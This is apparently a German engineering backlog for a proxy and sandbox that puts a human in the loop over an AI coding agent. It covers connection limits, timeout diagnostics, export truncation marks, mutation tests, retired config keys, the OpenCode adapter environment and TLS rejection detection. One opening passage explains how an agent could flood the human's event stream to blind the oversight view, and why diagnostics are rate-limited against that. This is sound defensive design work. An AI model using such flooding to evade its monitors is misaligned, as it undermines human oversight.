**Zwei neue Diagnostics, und sie werden zusammengefasst.** `PROXY_010` (Verbindungsgrenze erreicht) und `PROXY_011` (Anfrage-Rumpf stehengeblieben) hängen an keinem Fluss und gehen mit `flow_id: None` in den Ereignisstrom. Beide kommen höchstens einmal je Minute und nennen die Zahl der Fälle seit der letzten Meldung (`PressureWatch` in `handler.rs`). Das ist Teil der Grenze, nicht Bequemlichkeit: Ein Befund je Fall wäre ein Hebel gegen die Oberfläche des Menschen, deren Ereignisstrom `limits.event_buffer` Plätze hat und bei Überlauf `Lagged` meldet — der Agent könnte die Grenze also gegen die Sicht benutzen, die sie schützen soll. Aus demselben Grund hat auch das Zurückschreiben der `503` ein eigenes Kontingent von acht gleichzeitigen Schreibvorgängen und eine Frist von einer Sekunde; ist beides erschöpft, schließt die Verbindung ohne Antwort.

`PROXY_011` geht über die Spezifikation hinaus, die für diese Spanne nur `408` verlangt. Der Grund steht im Kontext des Issues selbst: Die Verbindung blieb vorher stehen, ohne dass **irgendetwas** davon sichtbar wurde. Ein `408`, das nur der Agent sieht, hätte die Ressource freigegeben und die Blindstelle gelassen.

Der Bereich `proxy` des Diagnostik-Registers reicht dafür jetzt bis `PROXY_019` statt bis `PROXY_009` — dieselbe Erweiterung, die `rules` und `doctor` schon haben. `LIMIT_001..006` bleiben unangetastet; `backlog/sprint-5.md` hat sie für HUM-057 vergeben.

**Die Kürzung ist bis in die Ausgabe sichtbar.** Der Daemon vermerkt einen abgeschnittenen Antwort-Rumpf über `ResponseSink::abort` als gekürzt; in HAR und CSV kam das nicht an, beide gaben die halbe Antwort als ganze aus. Das ist genau die Zusicherung dieses Issues, und sie hielt nur bis zur Ausgabe. HAR trägt die Marke jetzt zweimal: in `content.comment` für den Menschen, der die Datei öffnet, und in `_humanitl.response_body_truncated` für das Werkzeug, das sie liest. CSV bekommt die Spalte `response_body_truncated`, **angehängt** und nicht neben `response_size` eingeschoben, weil die Spaltenreihenfolge das Format ist. JSON Lines trug die Marke schon; der Name ist von dort übernommen, damit drei Dateien dasselbe Wort benutzen. `curl` bleibt außen vor: Es gibt eine Anfrage aus, keine Antwort.

**Was gemessen wurde.**

| Spanne | Vorher | Nachher |
|---|---|---|
| Anfrage-Rumpf, Kopf vollständig, danach zehn Bytes und Schweigen | nach acht Sekunden noch offen, keine Antwort, kein Ereignis | `408` nach genau der konfigurierten Frist; gemessen mit 1 s und 3 s, beide Schranken geprüft |
| Anfrage-Rumpf mit einer Pause von 2 s | lief durch | läuft mit 3 s durch (`X-Echo-Len: 1000` beim Ziel), wird mit 1 s abgeschnitten |
| Antwort-Rumpf, zwei Stücke im Abstand von 2 s | lief zu Ende, nicht als gekürzt vermerkt | mit 1 s abgeschnitten und als gekürzt aufgezeichnet, mit 3 s vollständig und nicht als gekürzt |
| `CONNECT` ohne `ClientHello` | unbegrenzt offen | schließt nach genau der konfigurierten Kopf-Frist; gemessen mit 1 s und 3 s |
| regulärer Handschlag mit 1 s Kopf-Frist | — | kommt zustande, Anfrage im Tunnel läuft durch |
| dritte Verbindung bei zwei gehaltenen | angenommen und liegen gelassen | mit `max_client_connections = 2` abgelehnt (`503`, `PROXY_010`), mit `3` bedient |
| dritte Verbindung bei zwei offenen `CONNECT`-Tunneln | angenommen: der Platz fiel beim Aufstieg, die Grenze galt für Tunnel gar nicht | abgelehnt, in beiden Stufen (vor dem `ClientHello` und nach fertigem Handschlag); nach dem Schließen der Tunnel wieder bedient |
| abgelehnte Verbindung, deren Anfrage schon im Puffer lag | `RST`, die `503` samt Grund verloren (`ConnectionReset`) | `503` mit `reason: max_client_connections` kommt an, danach ordentliches Dateiende |

Die HUM-101-Fälle bleiben grün: gehaltene Anfrage und streamende Durchreiche überleben, die leere Verbindung und die Keep-Alive-Lücke nicht.

**Was in der Spezifikation nicht stimmt.**

1. **„Jeder Paar-Test läuft über eine einspeisbare Uhr und in unter einer Sekunde Wanduhrzeit" ist mit diesem Schlüssel nicht erfüllbar; das Kriterium ist deshalb geändert und nicht bloß kommentiert.** Was stattdessen gilt, steht oben in der Liste: Zeit aus `tokio::time`, zwei verschiedene konfigurierte Werte, beide Schranken geprüft, 4,4 Sekunden für die ganze Datei. Die Messung dazu: Die kleinste Einheit von `limits.body_timeout_secs` ist eine Sekunde; zwei verschiedene konfigurierte Werte kosten daher mindestens vier Sekunden, sobald echte Zeit vergeht. `#[tokio::test(start_paused = true)]` wäre der Ausweg, ist hier aber untauglich: Die gestellte Uhr springt weiter, sobald der Ablauf nichts zu rechnen hat, und das schließt das Warten auf einen echten Socket ein. Ein Spike mit genau diesen Fällen ergab für eine konfigurierte Frist von einer Sekunde eine gemessene Spanne von 29,952 s bei einer Lesefrist des Tests von 30 s und von 1798,144 s bei einer von 1800 s — die Uhr folgte also der Lesefrist des Tests und nicht der Frist des Proxys, weil der Anfragekopf noch unterwegs war, als der Ablauf sich für untätig hielt. Ein eingeschobener virtueller Schlaf half nicht (28,662 s). Die Tests laufen deshalb an der Wand, wie die vier Fälle aus HUM-101 daneben; die ganze Datei `daemon/crates/proxy/tests/timeouts.rs` braucht 4,4 Sekunden. Der andere Weg wäre gewesen, eine Naht einzuziehen, über die Zeit **und** Ein-/Ausgabe in den Test hineingereicht werden. Er ist verworfen: Die Uhr allein reicht nicht — genau daran scheitert `start_paused` —, also müsste auch der Strom eingespeist werden, und damit prüfte der Test einen anderen Aufbau als den, der läuft. Für Grenzen, die Ressourcen des Wirts schützen sollen, ist das der falsche Tausch: Eine Naht nur für den Test führt ihrerseits Risiko ein, und vier Sekunden Wanduhrzeit sind kein Preis, der ihn rechtfertigt.
2. **Die Zeilennummern der Spezifikation sind verschoben.** `body::buffer` steht in `handler.rs` bei Zeile 602 (Spezifikation: 597), `body::tee` bei 1093 (Spezifikation: 984), `tls::accept` bei 341 (Spezifikation: 337). Der Kontext stimmt, die Zahlen nicht.
3. **`limits.body_timeout_secs` hat einen dritten Leser bekommen, den die Spezifikation nicht nennt.** `llm_probe.rs` ruft `body::buffer` ebenfalls auf. Dort bleibt die äußere Frist der Probe die maßgebliche Uhr; die Frist je Stück steht auf `MAX_TIMEOUT_MS` und kann nie vor ihr greifen. Zwei Uhren über einer Spanne wären der Fehler aus HUM-101.
4. **Die Zusicherung der Kürzung endete am Daemon.** Die Spezifikation trägt sie in `ResponseSink::abort` und in die Aufzeichnung, nennt aber keinen der Ausgabewege. HAR und CSV gaben eine abgeschnittene Antwort deshalb als vollständige aus. Behoben in `app/lib/features/history/export/`; die betroffenen Pfade des Issues hätten das nennen müssen.
5. **Die Spezifikation nennt `daemon/crates/config/tests/config_readers.rs` nur für die Registerzeile.** Dort steht zusätzlich `the_keys_without_a_reader_are_the_known_ones` mit einer festen Liste, die `limits.body_timeout_secs` enthielt; sie musste mit. Ebenso trägt `daemon/crates/config/tests/schema.rs` die Liste der Schlüssel aus CONVENTIONS 4.4, in die `limits.max_client_connections` gehört, und `daemon/crates/config/tests/fixtures/config.schema.json` ist ein Schnappschuss. Ebenso fehlen `daemon/crates/proxy/src/lib.rs` (die neuen öffentlichen Namen `PressureWatch`, `connection_limit_reached`, `idle_request_body`), `daemon/crates/proxy/src/llm_probe.rs` (dritter Aufrufer von `body::buffer`) und `daemon/crates/proxy/tests/support/mod.rs` (die beiden neuen Schalter des Gerüsts).
6. **`docs/DIAGNOSTICS.md` fehlt in den betroffenen Pfaden.** Die Datei wird aus dem Register erzeugt (`UPDATE_DIAG_DOCS=1 cargo test -p humanitl-core --test diag_docs`) und ändert sich, sobald ein Code dazukommt.

**Was bewusst nicht gebaut wurde.** Keine Grenze am Hold und keine an der Byte-Menge (Nicht-Ziel des Issues). Keine zweite Uhr über der ganzen Verbindung. Keine Uhr im IPC-Stapel — der Ereignisstrom der Oberfläche darf minutenlang stumm sein (CONVENTIONS 4.25). Keine Symmetrie zwischen Ablehnungs-Antwort und `block_response`: Die Ablehnung fällt vor jeder Anfrage, es gibt keinen `BlockReason` und keine `FlowId`, die in dem Format stünden.

**Mutationsproben.** Jede Änderung ist eine Zeile Produktionscode, angewandt in einer Kopie außerhalb des Repositories (`/home/nburkert/.cache/humanitl-hum120-mut`), danach dort zurückgenommen und mit `cmp` gegen den Arbeitsbaum geprüft. Der Ausgangslauf dieser Kopie war grün: elf Fälle in `timeouts.rs`, zwei Einheitentests in `handler.rs`, zwanzig in `history_export_test.dart`.

| Zeile | Änderung | Ergebnis |
|---|---|---|
| `handler.rs`, `ProxyLimits::from_config` | `body_timeout: Duration::from_secs(2)` statt aus `limits.body_timeout_secs` | rot: `a_silent_request_body_ends_in_408_after_limits_body_timeout_secs` („ended after 2.002827408s; the configured timeout is 1s"), `a_response_body_that_goes_silent_is_cut_and_recorded_as_truncated` („2.001294256s"), `a_request_body_that_pauses_shorter_than_its_clock_runs_to_the_end` |
| `body.rs`, `TeeBody::poll_frame`, Leerlauf-Zweig | `this.complete = true;` vor `finish()` | rot: `a_response_body_that_goes_silent_is_cut_and_recorded_as_truncated` („a cut answer must be recorded as truncated"), die übrigen neun grün |
| `handler.rs`, `handle_connect` | `let handshake_timeout = Duration::from_secs(2);` statt aus `limits.header_timeout` | rot: `a_connect_without_a_client_hello_ends_after_limits_header_timeout_secs` („2.000538243s; the configured timeout is 1s") |
| `core.rs`, `accept_loop` | `let limit = 3;` statt aus `handler.limits().max_client_connections` | rot: `the_connection_over_limits_max_client_connections_is_refused` (die dritte Verbindung wird bedient statt abgelehnt, der Test läuft in seine Lesefrist) |
| `handler.rs`, `refuse_idle_request_body` | Befund unterdrückt (`if let Some(since_last) = None::<u64>`) | rot: `a_silent_request_body_ends_in_408_after_limits_body_timeout_secs` (`left: []`, `right: ["PROXY_011"]`) |
| `core.rs`, `refuse` | Befund unterdrückt (`if let Some(since_last) = None::<u64>`) | rot: `the_connection_over_limits_max_client_connections_is_refused` („no `diagnostic` event within 10s") |
| `handler.rs`, `PressureWatch::hit_at` | `>= Duration::ZERO` statt `>= PRESSURE_REPORT_WINDOW` | rot: `a_pressure_watch_reports_once_per_window_and_counts_the_rest` (`left: Some(1)`, `right: None`) |
| `handler.rs`, `idle_request_body` | `value: secs.to_string()` statt `secs.saturating_mul(2)` | rot: `the_idle_body_diagnostic_names_its_key_and_its_numbers` (`left: "300"`, `right: "600"`) |
| `handler.rs`, `handle_connect` | `serve_connection(.., None)` statt `.., slot` — der Tunnel bekommt keinen Platz mehr | rot: `a_connect_tunnel_holds_its_place_until_it_is_closed` (die dritte Verbindung wird bedient statt abgelehnt). Der ältere Grenzen-Test bleibt dabei grün — genau das war sein blinder Fleck |
| `core.rs`, `write_refusal` | Leeren abgeschaltet (`while drained > REFUSAL_DRAIN_CAP_BYTES`) | rot: `the_connection_over_limits_max_client_connections_is_refused` mit `Os { code: 104, kind: ConnectionReset }` — die `503` samt Grund geht im `RST` verloren |
| `handler.rs`, `PressureWatch::hit_at` | `duration_since` statt `saturating_duration_since` | **überlebt**, siehe unten |
| `har.dart`, `_response` | `if (false) harBodyTruncated` — die Marke fällt aus `content.comment` | rot: zwei HAR-Tests, „does not contain 'the response body is incomplete…'" |
| `har.dart`, `harEntry` | `responseTruncated: false` — die Marke fällt aus `_humanitl` | rot: `har says in the comment and in _humanitl that the answer was cut` |
| `csv.dart`, `encodeCsv` | `responseTruncated: false` — die Spalte ist immer `false` | rot: `csv carries the mark in its own column` |

Vierzehn Mutationen, eine hat überlebt. Das Zusammenfassen selbst prüfen zwei Einheitentests in `daemon/crates/proxy/src/handler.rs`; sie speisen die Uhr über `PressureWatch::hit_at` ein, weil ein Integrationstest dafür eine Minute warten müsste.

**Die überlebende Mutation, und warum sie überlebt.** Der Erstreview nannte `now.duration_since(last)` als möglichen Absturz und `saturating_duration_since` als kostenlose Absicherung. Die Änderung ist übernommen, aber die Probe belegt, dass der Absturz mit dieser Fassung nicht eintritt: `Instant::duration_since` sättigt seit Rust 1.60 selbst, und `tokio::time::Instant` reicht an genau diese Implementierung durch. Der Test mit der zurückgehenden Uhr bleibt deshalb grün, ob dort `duration_since` oder `saturating_duration_since` steht. Behalten wird die sättigende Form trotzdem: Sie sagt im Code, was gemeint ist, statt sich auf eine Zusage zu verlassen, die man nachschlagen muss. Der Test ist damit kein Beleg für die Zeile, sondern für das Verhalten — und dass er das nicht unterscheidet, steht hier, statt eine grüne Zeile für einen Beweis auszugeben.

Was sonst **nicht** geprüft ist: dass der Weg vom Proxy in das Fenster die Wanduhr benutzt — `hit()` ruft `tokio::time::Instant::now()`, und ein Test dafür bräuchte wieder die Minute.

## HUM-121 · Zwei Schlüssel ohne Leser: `ui.sound` und `experimental.ws_hold`
Sprint: 3 · Größe: S · Abhängigkeiten: HUM-101 · Blockiert: —

### Kontext
Beide stehen im Schema, werden beim Laden geprüft, erscheinen in `docs/CONFIG.md` und haben außerhalb von `#[cfg(test)]` keinen Leser. HUM-101 hat sie im Register auf `pending(HUM-121)` gesetzt; damit lügt das Dokument nicht mehr, aber die Schlüssel sind weiter da.

- `ui.sound`: Im Rust-Teil kein Treffer, in der Oberfläche kein Ton. Der Doku-Kommentar räumte die fehlende Wirkung selbst ein („Im MVP ohne Wirkung", HUM-034).
- `experimental.ws_hold`: Treffer nur unter `#[cfg(test)]` (`daemon/bin/humanitl/src/cli.rs:694`). Ein WebSocket-Upgrade entscheidet heute allein die Regel (ADR-0007 nennt den Schalter, der Proxy kennt ihn nicht).

Der dritte Schlüssel ohne Leser, den das Register gefunden hat, gehört nicht hierher: `resolver.nameserver` bedient HUM-115, das den `HickoryResolver` hinter den Schlüssel baut und damit den DNS-Beweis von ESC-3 führt.

### Ziel
Für beide Schlüssel eine begründete Entscheidung, Einbau oder Streichung, und danach kein Eintrag `pending(HUM-121)` mehr im Register.

### Nicht-Ziel
Kein Resolver-Adapter (HUM-115). Keine Verdrahtung von `ui.notifications` und `ui.theme`: Die hängen an `GetConfig` und gehören zu HUM-069.

### Betroffene Pfade
- `daemon/crates/config/src/model.rs`, `src/validate.rs`, `tests/schema.rs`, `tests/config_readers.rs`, `tests/fixtures/config.schema.json` (erzeugt)
- `docs/CONFIG.md` (erzeugt), `backlog/CONVENTIONS.md` 4.4 und 4.25
- bei Einbau zusätzlich der jeweilige Leser: der Melder der Oberfläche beziehungsweise `daemon/crates/proxy/src/pipeline.rs`

### Spezifikation
Das Muster ist HUM-088: Ein Schalter, der nie einen Weg geschaltet hat, fällt weg, statt nachträglich einen zu bekommen — ohne Alias, danach ein harter `CONFIG_002` mit dem Schlüsselnamen. Für `experimental.ws_hold` spricht dafür, dass `Experimental` seinen eigenen Abbau ankündigt; dagegen spricht ADR-0007, der den Schalter als geplanten Weg nennt. Entschieden wird er sinnvoll erst nach HUM-110: Solange ein WebSocket-Upgrade überhaupt nicht zustande kommt, gibt es nichts, was ein Schalter anhalten könnte. Für `ui.sound` gilt: Ein Schalter ohne Ton ist keine Einstellung.

Jede Entscheidung wird in `backlog/CONVENTIONS.md` 4.25 fortgeschrieben, damit ein späterer Fehlerbericht sie einordnen kann.

### Tests
- `config_readers`: kein `pending(HUM-121)` mehr; die Liste der Schlüssel ohne Leser wird kürzer.
- Für jeden gestrichenen Schlüssel: eine `config.toml`, die ihn setzt, liefert `CONFIG_002` mit `Severity::Error` und dem Schlüsselnamen im Text.
- Für jeden eingebauten Schlüssel: ein Test, der die Wirkung zeigt, nicht nur das Lesen.

### Akzeptanzkriterien
- [x] Für beide Schlüssel steht die Entscheidung samt Grund in `backlog/CONVENTIONS.md` 4.25 (Nachtrag HUM-121, 2026-09-06: je ein Absatz, dazu der Satz, warum die Spezifikation an einer Stelle nicht befolgt wird).
- [x] Das Register kennt keinen Eintrag `pending(HUM-121)` mehr: `grep -c "pending(HUM-121)" daemon/crates/config/tests/config_readers.rs docs/CONFIG.md` zählt 0 und 0, `the_keys_without_a_reader_are_the_known_ones` listet noch fünf Pfade, keiner davon aus diesem Issue.
- [x] `docs/CONFIG.md` und die Schema-Fixture kommen aus den Generatorläufen (`UPDATE_CONFIG_DOCS=1 UPDATE_SNAPSHOTS=1 cargo test -p humanitl-config`), und der Lauf ohne die Variablen ist danach grün — von Hand geändert wäre er rot.
- [x] `make check` mit `STRICT=1` grün, also einschließlich clippy mit `-D warnings` und `cargo fmt --all -- --check` (2026-09-06).

### Fallstricke
- Ein gestrichener Schlüssel ist ein Bruch für bestehende Dateien: aus dem stillen No-Op wird ein harter `CONFIG_002`. Bei `experimental.*` ist das angekündigt, bei `ui.*` nicht — dort gehört die Streichung in die Freigabe-Notizen.
- `ui.sound` einzubauen heißt, einen Tonausgabepfad in die Oberfläche zu ziehen. Das ist eine Fähigkeit und keine Verdrahtung; wer sie nicht will, streicht den Schlüssel und schreibt den Grund nach `CONVENTIONS.md` 4.25.

### Stand (2026-09-06)

**Beide Schlüssel sind gestrichen, keiner eingebaut.** Die Begründungen stehen
in `backlog/CONVENTIONS.md` 4.25 und werden hier nicht wiederholt; was hier
steht, sind die drei Stellen, an denen die Umsetzung von der Spezifikation
abweicht.

**Der Befund ist `CONFIG_005` als Warnung, nicht der harte `CONFIG_002` aus dem
Text oben.** Der Text dieses Issues ist älter als HUM-088: Seit dessen Nachtrag
gilt für jeden Schlüssel, den wir selbst streichen, die Milde aus CONVENTIONS
4.25 — Eintrag in `alias::RETIRED`, Warnung mit Issue und Grund, der Daemon
startet. Ein harter Fehler wäre die Strafe für eine Entscheidung, die wir
getroffen haben, nicht der Nutzer. Die Regel gewinnt gegen den Issue-Text.

**`experimental.ws_hold` wurde vor HUM-110 entschieden, nicht danach.**
`BACKLOG.md` ordnet dieses Issue hinter HUM-110 ein, das den Upgrade-Pfad erst
baut; HUM-110 steht offen in `backlog/sprint-1.md` und gehört nicht in diesen
Sprint. Zu warten hieße, einen Schlüssel im Schema zu lassen, der auf einem
nicht vorhandenen Weg eine Wirkung zusagt — genau der Zustand, den das Register
melden soll. Kommt der Weg, kommt der Schalter mit seinem Leser im selben
Commit zurück; `docs/adr/0007-rule-model.md` sagt das an der Stelle, an der er
bisher als offene Tür stand.

**Zwei Tests mussten ihren Nachbarn wechseln, und das ist keine Kosmetik.**
`the_retired_port_map_warns_and_stays_one_entry` belegte mit `experimental.ws_hold`,
dass das Laden über einen entfallenen Schlüssel **hinweggeht** statt abzubrechen
(`continue` statt `break`). Nach der Streichung ist `experimental.h2_upstream`
der einzige Schlüssel der Gruppe, also übernimmt `findings.enabled` die Rolle
des Nachbarn dahinter — die Zusicherung bleibt dieselbe, sie greift jetzt über
eine Gruppengrenze hinweg. Ebenso in `the_whole_ladder_in_one_go`, wo
`ui.notifications` die Sprosse „Umgebung" von `ui.sound` erbt. Neu dazu kam
`the_two_retired_switches_warn_each_and_let_the_daemon_start`: eine Datei mit
beiden Schlüsseln bekommt **zwei** Warnungen, nicht eine für alle zusammen.

**Die Oberfläche trug den Schlüssel mit.** `attention.dart` nannte `ui.sound`
im Doku-Kommentar des Melders, und `attention_test.dart` prüfte die Zeile in
`docs/CONFIG.md` gegen die Spalte „Wirkung". Beide sind nachgezogen; der Test
verlangt jetzt, dass `ui.sound` **nicht** mehr als Einstellung in der Tabelle
steht und sehr wohl in der Tabelle der entfallenen Schlüssel — sonst wäre die
Streichung durch eine Rückkehr ohne Leser still rückgängig zu machen.


---

## HUM-135 · Ein genanntes Kommando bekommt den Adapter nicht
Sprint: 3 · Größe: M · Abhängigkeiten: HUM-037 · Blockiert: HUM-046 (letztes Kriterium), HUM-038 Schritt 1

### Kontext
`daemon/crates/ipc/src/sandbox.rs:1815-1819` entscheidet so:

```rust
let agent = if command.is_empty() {
    self.agent_contribution(&config, &work_src, &profile)?
} else {
    AgentContribution::default()
};
```

Wer ein Kommando nennt, bekommt vom Agent-Adapter **nichts**: keine Umgebung, keine Dateien, keine Berechtigungen. Gemessen am 2026-09-07 mit `humanitl run --ask none -- /usr/bin/env` gegen einen echten Daemon (Vorgabe `agent.adapter = "opencode"`): In der Sandbox steht das Env-Kit (Proxy, CA, `HUMANITL`, `HOME`, `PATH`) und **keine einzige** `OPENCODE_*`-Variable. Es fehlen damit `OPENCODE_CONFIG` (die `opencode.json` mit dem Anbieter `humanitl-local` und dem Modell dieser Sitzung), `OPENCODE_MODELS_PATH` und `OPENCODE_DISABLE_MODELS_FETCH` (der mitgelieferte Modellkatalog statt des Netzes), `OPENCODE_DISABLE_SHARE` und `OPENCODE_AUTO_SHARE` (kein Hochladen der Sitzung), `OPENCODE_DISABLE_AUTOUPDATE`, `OPENCODE_DISABLE_LSP_DOWNLOAD` und `OPENCODE_PERMISSION`.

Das trifft den Normalfall: `humanitl run -- opencode` ist die Zeile, die ein Mensch schreibt, wenn er sieht, dass `run` ein Kommando hinter `--` nimmt. Er bekommt dann einen Agenten ohne die Konfiguration, die dieses Produkt für ihn baut — mit Durchreichregel im Regelsatz, aber ohne den Anbieter, der sie benutzt. Gemessen im M3-Demolauf: OpenCode holt seinen Katalog (`GET models.opencode.ai/api.json`, von der mitgelieferten Regel `…0009` geblockt) und fällt danach auf seinen eigenen Dienst zurück (elfmal `POST opencode.ai /zen/v1/chat/completions`), statt mit dem lokalen Modell zu sprechen.

Dieselbe grobe Regel steht in der Kommandozeile, nur andersherum: `daemon/bin/humanitl/src/cmd/run.rs` bricht die Prüfung auf ein Vollbild-TUI mit `if !args.cmd.is_empty() { return Ok(()); }` ab. `humanitl run --ask terminal -- opencode` wird also **nicht** mit `CLI_002` abgelehnt, obwohl genau der Vollbild-Agent startet, dessen Frage-Kasten dort nicht zu sehen wäre. Beide Stellen meinen „das wirksame Kommando" und prüfen „wurde eines genannt".

### Ziel
Der Adapter trägt bei, wenn das wirksame Kommando sein Agent ist — ob es genannt wurde oder nicht. `humanitl run -- opencode`, `humanitl run -- /pfad/zu/opencode` und `humanitl run` ohne Kommando bekommen dieselbe Umgebung und dieselben Dateien; `humanitl run -- bash` bekommt weiterhin nichts. Die Kommandozeile entscheidet die TUI-Frage mit derselben Regel.

### Nicht-Ziel
Ein Adapter, der an einem beliebigen Kommando etwas erkennt (Heuristik über Argumente). Ein zweiter Adapter. Änderungen an dem, was der Adapter beiträgt.

### Betroffene Pfade
- `daemon/crates/sandbox/src/agent/mod.rs` (neue Methode am Trait), `daemon/crates/sandbox/src/agent/opencode.rs`
- `daemon/crates/ipc/src/sandbox.rs` (die Bedingung oben)
- `daemon/bin/humanitl/src/cmd/run.rs` (`refuse_terminal_ask`)
- `daemon/crates/sandbox/tests/opencode_adapter.rs`, `daemon/bin/humanitl/tests/cli.rs`

### Spezifikation
`AgentAdapter::is_agent_command(&self, command: &[OsString]) -> bool`: wahr für ein leeres Kommando und wahr, wenn der Dateiname des ersten Elements dem Kommando des Adapters entspricht (`opencode`, auch als absoluter Pfad). Sonst falsch. Der Daemon ruft den Beitrag genau dann ab; die Kommandozeile lehnt `--ask terminal` genau dann ab, wenn der Adapter ein Vollbild-TUI ist **und** `is_agent_command` gilt.

### Tests
- `the_adapter_contributes_to_its_own_command_however_it_is_written`: leeres Kommando, `opencode`, `/usr/local/bin/opencode`, `./opencode` — jedes Mal Beitrag; `bash`, `sh -c 'opencode'`, `python3` — kein Beitrag.
- `a_named_agent_still_gets_its_environment` (ipc): `Sandbox(Start)` mit `command = ["opencode"]` liefert `OPENCODE_CONFIG`, `OPENCODE_MODELS_PATH` und `OPENCODE_DISABLE_MODELS_FETCH` in der Umgebung der Sitzung.
- `ask_terminal_is_cli_002_for_the_named_agent` (cli): `run --ask terminal -- opencode` endet `CLI_002`; `run --ask terminal -- bash` nicht.

### Akzeptanzkriterien
- [x] `humanitl run --ask none -- /usr/bin/env` zeigt weiterhin keine `OPENCODE_*`-Variablen; mit `-- opencode` bekommt der Agent sie, und `humanitl sandbox argv -- opencode` zeigt dieselbe Umgebung, die der Start baut. **Gemessen am 2026-09-07**, und die zweite Hälfte am stärksten Beleg, den es gibt: Das echte OpenCode wählt im M3-Lauf jetzt das Modell dieser Sitzung (`> build · mock` im Transkript) und spricht mit dem lokalen Modell, statt seinen Katalog zu holen und auf den eigenen Dienst auszuweichen. `the_adapter_knows_its_own_command_however_it_is_written` misst die Regel selbst: `opencode`, `/usr/local/bin/opencode`, `./opencode` und das leere Kommando sind der Agent, `bash`, `/bin/sh`, `python3`, `opencoded`, `myopencode` und `sh -c "opencode"` nicht.
- [x] `humanitl run --ask terminal -- opencode` endet mit `CLI_002`, `-- bash` nicht. **Gemessen** in `the_named_agent_is_still_the_fullscreen_agent` (drei Schreibweisen) neben dem bestehenden `a_command_of_its_own_is_not_the_fullscreen_agent`.
- [x] Das M3-Demoskript erreicht mit `M3_OPENCODE_BIN` das lokale Modell: `m3_real_opencode` grün (HUM-046, letztes Kriterium). **Gemessen am 2026-09-07: `M3 demo: OK` (die Zahl der Zusicherungen wandert mit dem Lauf und steht dort; an jenem Tag waren es 122, am selben Tag 124 nach der Modellauswahl von HUM-037 und danach mehr, als HUM-067 die zweite Sitzung des echten Agenten dazunahm)**, darunter „the real agent added requests of its own to the language model", „at least one of them was an inference request", „never asked the model catalogue host its documentation names", „nor the one the installed version really uses" und „left nothing waiting for a human".
- [x] `make check` grün. **`STRICT=1 make check` rc=0 am 2026-09-07.**

### Fallstricke
- Der Vergleich läuft über den Dateinamen und nicht über den ganzen Pfad; ein Wrapper namens `opencode`, der etwas anderes startet, bekommt damit die Umgebung des Adapters. Das ist gewollt: Wer sein `opencode` selbst gebaut hat, will die Konfiguration dieses Produkts.
- `sandbox.env` steht weiterhin über dem Adapter (`sandbox.rs`, Reihenfolge der Quellen), das **Profil nicht**: Die Reihenfolge in `daemon/crates/sandbox/src/bwrap_args.rs` ist Profil, dann Sitzung (Adapter und `sandbox.env`), dann Shim, und der letzte gewinnt. Für ein genanntes Kommando überschreibt der Adapter damit neuerdings `HOME`, `TERM`, `LANG`, `NODE_EXTRA_CA_CERTS` und die `XDG_*` des mitgelieferten Profils — mit denselben Werten oder mit der richtigen CA, und `env_origin` weist sie als `ValueOrigin::Adapter` aus. Die Bedingung ändert nur, **ob** der Adapter beiträgt.

### Referenzen
`daemon/crates/ipc/src/sandbox.rs:1815-1819`; `daemon/bin/humanitl/src/cmd/run.rs` (`refuse_terminal_ask`); `backlog/sprint-3.md` HUM-037 und HUM-046; Messung am 2026-09-07 im M3-Lauf und mit `humanitl run --ask none -- /usr/bin/env`.

---

## HUM-149 · curl lehnt die CA erst nach dem Handschlag ab, und der Proxy sieht es nicht
Sprint: 3 · Größe: M · Abhängigkeiten: HUM-045 · Blockiert: das erste Akzeptanzkriterium von HUM-045 und das zweite offene von HUM-106

### Kontext
HUM-045 erkennt einen abgelehnten Handschlag, wenn der Client **während** des Handschlags mit `unknown_ca` oder `bad_certificate` abbricht (`tls_observe::classify`, gerufen aus `handler.rs::note_handshake_failure`). Der Integrationstest belegt das mit einem rustls-Client, und `openssl s_client -verify_return_error` verhält sich genauso: Flow mit `tls_handshake_failed`, dazu `TLS_001` (gemessen am 2026-09-11).

curl tut es nicht, und curl ist das Werkzeug, für das die Karte gebaut ist. Gemessen am 2026-09-11 mit curl 8.22 und OpenSSL 3.6 in der Sandbox:

- `curl --cacert /dev/null https://example.com`: curl scheitert beim Laden der leeren Datei (Exit 77), bevor es ein Zertifikat sieht. Der Proxy verbucht einen abgerissenen Handschlag, Flow ja, `TLS_001` nein; `TLS_002` erst nach drei Abbrüchen in zehn Sekunden.
- `curl --cacert <fremde Wurzel> https://example.com`: curl schließt den TLS-1.3-Handschlag vollständig ab (sein `Finished` geht hinaus), prüft das Zertifikat **danach**, legt ohne Alert auf und endet mit Exit 60. Für den Proxy ist das eine gelungene Verbindung, in der nie eine Anfrage kam. Er verbucht nichts und meldet nichts; der Mensch sieht keinen Flow und keine Karte.

### Ziel
Wenn ein Client einen Tunnel öffnet, den Handschlag abschließt und die Verbindung schließt, ohne eine einzige Anfrage zu senden, verbucht der Proxy einen Flow und meldet `TLS_001` mit dem Hinweis auf das Werkzeug, der Satz aber vorsichtiger als bei einem ausgesprochenen Alert: Der Client hat nichts gesagt, der Proxy schließt aus dem Verhalten.

### Nicht-Ziel
Eine Erkennung, die jede kurze Verbindung meldet: Ein Client, der wenigstens eine Anfrage gestellt hat, hat der CA vertraut. Eine Änderung an curl oder an den Umgebungsvariablen der Sandbox.

### Spezifikation
Eine neue Art in `TlsFailure`, `ClosedAfterHandshake`: Der Handschlag stand, die Verbindung endete sauber oder mit Abbruch, und `serve_connection` hat keine einzige Anfrage bedient. Sie zählt als Ablehnung (`is_rejection`), verbucht einen Flow mit `tls_handshake_failed` wie die übrigen und meldet `TLS_001` über dasselbe Zählfenster je Host, mit einem eigenen `why`-Satz, der sagt, dass der Client die Verbindung nach dem Handschlag ohne Anfrage geschlossen hat, was meist heißt, dass er der CA nicht traut. Der Werkzeughinweis kommt wie bisher aus dem `User-Agent` des `CONNECT`.

### Tests
- Integrationstest mit einem Client, der den Handschlag abschließt und ohne Anfrage schließt: ein Flow, ein `TLS_001`.
- Integrationstest mit einem Client, der eine Anfrage stellt und dann schließt: kein Befund.
- Messung mit dem echten curl in der Sandbox, wie im Kontext, danach Flow und Karte.

### Akzeptanzkriterien
- [x] Ein Tunnel, der nach dem Handschlag ohne Anfrage endet, ergibt einen Flow mit `tls_handshake_failed` und ein `TLS_001` am selben Flow. **Gemessen am 2026-09-11**: `a_tunnel_closed_after_the_handshake_gets_one_tls_001_and_a_flow`; die Mutation ohne Auslöser macht ihn rot.
